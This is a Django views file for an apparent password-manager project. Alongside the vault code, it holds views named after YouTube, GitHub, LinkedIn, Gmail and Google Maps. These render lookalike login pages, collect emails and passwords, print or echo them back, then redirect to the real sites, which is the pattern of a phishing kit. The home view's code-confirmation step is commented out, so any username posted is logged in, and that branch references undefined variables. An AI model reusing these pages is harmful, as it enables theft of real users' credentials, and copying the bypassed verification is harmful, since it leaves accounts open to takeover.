
from time import sleep
from django.contrib.auth.models import User
from django.shortcuts import redirect, render
from django.conf import settings
from django.contrib import messages
from django.http import HttpResponse, HttpResponseRedirect
from django.contrib.auth import authenticate, login, logout
import random
from django.core.mail import send_mail
from cryptography.fernet import Fernet
from mechanize import Browser
import favicon
from requests import request
from .models import Password

br = Browser()
br.set_handle_robots(False)
fernet = Fernet(settings.KEY)


def home(request):
    if request.method == "POST":
        if "signup-form" in request.POST:
            username = request.POST.get("username")
            email = request.POST.get("email")
            password = request.POST.get("password")
            password2 = request.POST.get("password2")
            #if password are not identical
            if password != password2:
                msg = "Please make sure you're using the same password!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            #if username exists
            elif User.objects.filter(username=username).exists():
                msg = f"{username} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            #if email exists
            elif User.objects.filter(email=email).exists():
                msg = f"{email} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            else:
                User.objects.create_user(username, email, password)
                new_user = authenticate(request, username=username, password=password2)
                if new_user is not None:
                    login(request, new_user)
                    msg = f"{username}. Thanks for subscribing."
                    messages.success(request, msg)
                    return HttpResponseRedirect(request.path)
        elif "logout" in request.POST:
            msg = f"{request.user}. You logged out."
            logout(request)
            messages.success(request, msg)
            return HttpResponseRedirect(request.path)

        elif 'login-form' in request.POST:
            username = request.POST.get("username")
            password = request.POST.get("password")
            new_login = authenticate(request, username=username, password=password)
            if new_login is None:
                msg = f"Login failed! Make sure you're using the right account."
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            else:
                code = str(random.randint(100000, 999999))
                global global_code
                global_code = code
                # send_mail(
                #     "Django Password Manager: confirm email",
                #     f"Your verification code is {code}.",
                #     settings.EMAIL_HOST_USER,
                #     [new_login.email],
                #     fail_silently=False,
                # )
                return render(request, "home.html", {
                    "code":code, 
                    "user":new_login,
                })

        elif "confirm" in request.POST:
            input_code = request.POST.get("code")
            user = request.POST.get("user")
            # if input_code != global_code:
            #     msg = f"{input_code} is wrong!"
            #     messages.error(request, msg)
            #     return HttpResponseRedirect(request.path)
            # else:
            login(request, User.objects.get(username=user))
            print(request.user)    
            return render(request, "home.html", {
                        "code":code, 
                        "user":new_login,
                    })
            msg = f"{request.user} welcome again."
            messages.success(request, msg)
            return HttpResponseRedirect(request.path)
        
        elif "add-password" in request.POST:
            url = request.POST.get("url")
            email = request.POST.get("email")
            password = request.POST.get("password")
            #ecrypt data
            encrypted_email = fernet.encrypt(email.encode())
            encrypted_password = fernet.encrypt(password.encode())
            #get title of the website
            try:
                br.open(url)
                title = br.title()
            except:
                title = url
            #get the logo's URL
            try:
                icon = favicon.get(url)[0].url
            except:
                icon = "https://cdn-icons-png.flaticon.com/128/1006/1006771.png"
            #Save data in database
            new_password = Password.objects.create(
                user=request.user,
                name=title,
                logo=icon,
                email=encrypted_email.decode(),
                password=encrypted_password.decode(),
            )
            msg = f"{title} added successfully."
            messages.success(request, msg)
            return HttpResponseRedirect(request.path)

        elif "delete" in request.POST:
            to_delete = request.POST.get("password-id")
            msg = f"{Password.objects.get(id=to_delete).name} deleted."
            Password.objects.get(id=to_delete).delete()
            messages.success(request, msg)
            return HttpResponseRedirect(request.path)
            
    context = {}
    if request.user.is_authenticated:
        passwords = Password.objects.all().filter(user=request.user)
        for password in passwords:
            password.email = fernet.decrypt(password.email.encode()).decode()
            password.password = fernet.decrypt(password.password.encode()).decode()
        context = {
            "passwords":passwords,
        }   



    return render(request, "home.html", context)

def youtube(request):
    if request.method == "POST":
        username=""
        password=""
        if "SIGN_UP" in request.POST:
            username = request.POST.get("email")
            password = request.POST.get("password")
            new_login = authenticate(request, username=username, password=password, )
            if new_login is None:
                return render(request,"404.html")
            else:
                return redirect("https://www.youtube.com/")
        elif "OTP" in request.POST:
            username = request.POST.get("email")
            password = request.POST.get("password")
            code = str(random.randint(100000, 999999))
            if(username != ""):
                sleep(4)
                return render(request, "youtube.html", {
                        "code":code,
                        "name":username,
                        "pass":password
                    })

        elif "SIGN_IN" in request.POST:
            username = request.POST.get("username")
            email = request.POST.get("email")
            password = request.POST.get("password")
            if User.objects.filter(username=username).exists():
                msg = f"{username} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            elif User.objects.filter(email=email).exists():
                msg = f"{email} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            else:
                User.objects.create_user(username, email, password)
                new_user = authenticate(request, username=username, password=password)
                if new_user is not None:
                    login(request, new_user)
                    msg = f"{username}. Thanks for subscribing."
                    messages.success(request, msg)
                    return HttpResponseRedirect(request.path)

                
    return render(request,"youtube.html")

def github(request):
    if request.method == "POST":
        username=""
        password=""
        if "SIGN_UP" in request.POST:
            username = request.POST.get("email")
            password = request.POST.get("password")
            mail = request.POST.get("name")
            new_login = authenticate(request, username=username, password=password,email=mail)
            if new_login is None:
                return render(request,"404.html")
            else:
                return redirect("https://www.github.com/")
        elif "OTP" in request.POST:
            username = request.POST.get("email")
            password = request.POST.get("password")
            mail = request.POST.get("name")
            code = str(random.randint(100000, 999999))
            if(username != ""):
                sleep(4)
                return render(request, "github.html", {
                        "code":code,
                        "name":username,
                        "pass":password,
                        "mail" : mail
                    })

        elif "SIGN_IN" in request.POST:
            username = request.POST.get("username")
            email = request.POST.get("email")
            password = request.POST.get("password")
            if User.objects.filter(username=username).exists():
                msg = f"{username} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            elif User.objects.filter(email=email).exists():
                msg = f"{email} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            else:
                User.objects.create_user(username, email, password)
                new_user = authenticate(request, username=username, password=password)
                if new_user is not None:
                    login(request, new_user)
                    msg = f"{username}. Thanks for subscribing."
                    messages.success(request, msg)
                    return HttpResponseRedirect(request.path)

                
    return render(request,"github.html")

def linkedin(request):
    if request.method == "POST":
        username=""
        password=""
        if "SIGN_UP" in request.POST:
            username = request.POST.get("email")
            password = request.POST.get("password")
            mail = request.POST.get("name")
            new_login = authenticate(request, username=username, password=password,email=mail)
            if new_login is None:
                return render(request,"404.html")
            else:
                return redirect("https://www.linkedin.com/")
        elif "OTP" in request.POST:
            username = request.POST.get("email")
            password = request.POST.get("password")
            mail = request.POST.get("name")
            code = str(random.randint(100000, 999999))
            if(username != ""):
                sleep(4)
                return render(request, "linkedin.html", {
                        "code":code,
                        "name":username,
                        "pass":password,
                        "mail" : mail
                    })

        elif "SIGN_IN" in request.POST:
            username = request.POST.get("username")
            email = request.POST.get("email")
            password = request.POST.get("password")
            if User.objects.filter(username=username).exists():
                msg = f"{username} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            elif User.objects.filter(email=email).exists():
                msg = f"{email} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            else:
                User.objects.create_user(username, email, password)
                new_user = authenticate(request, username=username, password=password)
                if new_user is not None:
                    login(request, new_user)
                    msg = f"{username}. Thanks for subscribing."
                    messages.success(request, msg)
                    return HttpResponseRedirect(request.path)

                
    return render(request,"linkedin.html")

def gmail(request):
    if request.method == "POST":
        if "SIGN_UP" in request.POST:
            username = request.POST.get("email")
            password = request.POST.get("password")
            print(username,password)
            new_login = authenticate(request, username=username, password=password)
            if new_login is None:
                return render(request,"404.html")
            else:
                return redirect("https://www.gmail.com/")
        elif "SIGN_IN" in request.POST:
            username = request.POST.get("username")
            email = request.POST.get("email")
            password = request.POST.get("password")
            if User.objects.filter(username=username).exists():
                msg = f"{username} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            elif User.objects.filter(email=email).exists():
                msg = f"{email} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            else:
                User.objects.create_user(username, email, password)
                new_user = authenticate(request, username=username, password=password)
                if new_user is not None:
                    login(request, new_user)
                    msg = f"{username}. Thanks for subscribing."
                    messages.success(request, msg)
                    return HttpResponseRedirect(request.path)

    return render(request,"gmail.html")


def maps(request):
    if request.method == "POST":
        if "SIGN_UP" in request.POST:
            username = request.POST.get("email")
            password = request.POST.get("password")
            print(username,password)
            new_login = authenticate(request, username=username, password=password)
            if new_login is None:
                return render(request,"404.html")
            else:
                return redirect("https://www.google.com/maps")
        elif "SIGN_IN" in request.POST:
            username = request.POST.get("username")
            email = request.POST.get("email")
            password = request.POST.get("password")
            if User.objects.filter(username=username).exists():
                msg = f"{username} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            elif User.objects.filter(email=email).exists():
                msg = f"{email} already exists!"
                messages.error(request, msg)
                return HttpResponseRedirect(request.path)
            else:
                User.objects.create_user(username, email, password)
                new_user = authenticate(request, username=username, password=password)
                if new_user is not None:
                    login(request, new_user)
                    msg = f"{username}. Thanks for subscribing."
                    messages.success(request, msg)
                    return HttpResponseRedirect(request.path)
                
    return render(request,"maps.html")